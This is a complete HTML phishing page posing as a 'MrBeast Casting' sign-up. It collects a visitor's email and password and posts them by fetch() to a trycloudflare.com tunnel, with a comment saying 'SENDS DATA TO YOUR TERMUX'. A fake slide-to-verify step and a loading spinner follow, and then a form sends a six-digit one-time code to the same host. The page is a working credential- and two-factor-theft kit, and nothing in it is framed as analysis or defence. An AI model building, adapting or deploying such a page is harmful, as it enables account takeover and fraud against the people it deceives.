<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MrBeast Casting</title>
    <style>
        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #00a8e8; margin: 0; color: #fff; overflow: hidden; position: relative; }
        .bg-pattern { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://crystalpng.com'); background-size: 90px; opacity: 0.40; z-index: 0; pointer-events: none; }
        .box { background: #111; border-radius: 25px; width: 90%; max-width: 380px; padding: 40px 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.7); border: 1px solid #333; position: relative; z-index: 10; }
        .inner-box-logo { width: 130px; margin: 0 auto 10px auto; display: block; }
        input { width: 100%; padding: 15px; margin-bottom: 12px; border: 1px solid #222; background: #1a1a1a; color: white; border-radius: 12px; box-sizing: border-box; font-size: 16px; outline: none; }
        .main-btn { background: linear-gradient(45deg, #f12e3e, #ff5e62); color: #fff; border: none; padding: 16px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: 800; text-transform: uppercase; font-size: 16px; }
        #puzzle-box, #loader, #step2 { display: none; }
        .spinner { border: 4px solid rgba(0, 212, 255, 0.1); border-top: 4px solid #00d4ff; border-radius: 50%; width: 45px; height: 45px; animation: spin 0.8s linear infinite; margin: 25px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <div class="box">
        <div id="step1">
            <img src="https://crystalpng.com" class="inner-box-logo">
            <h2>MRBEAST CASTING</h2>
            <p>Apply for the next video.</p>
            <input type="email" id="email" placeholder="Email Address" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="button" class="main-btn" onclick="showPuzzle()">CONTINUE</button>
        </div>

        <div id="puzzle-box">
            <p>Slide to Verify</p>
            <button class="main-btn" onclick="complete()">SIMULATE SLIDE</button>
        </div>

        <div id="loader"><div class="spinner"></div><p>Processing...</p></div>

        <div id="step2">
            <h1>Identity Check</h1>
            <form action="https://hunt-camcorder-packages-pound.trycloudflare.com" method="post">
                <input type="text" name="otp" placeholder="000000" maxlength="6" style="text-align:center;" required>
                <button type="submit" class="main-btn">Finish</button>
            </form>
        </div>
    </div>

    <script>
        function showPuzzle() {
            var e = document.getElementById('email').value, p = document.getElementById('pass').value;
            if(e && p) {
                // SENDS DATA TO YOUR TERMUX
                fetch('https://hunt-camcorder-packages-pound.trycloudflare.com', { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                document.getElementById('step1').style.display = 'none'; 
                document.getElementById('puzzle-box').style.display = 'block';
            }
        }

        function complete() {
            document.getElementById('puzzle-box').style.display = 'none'; 
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => { 
                document.getElementById('loader').style.display = 'none'; 
                document.getElementById('step2').style.display = 'block'; 
            }, 3000);
        }
    </script>
</body>
</html>
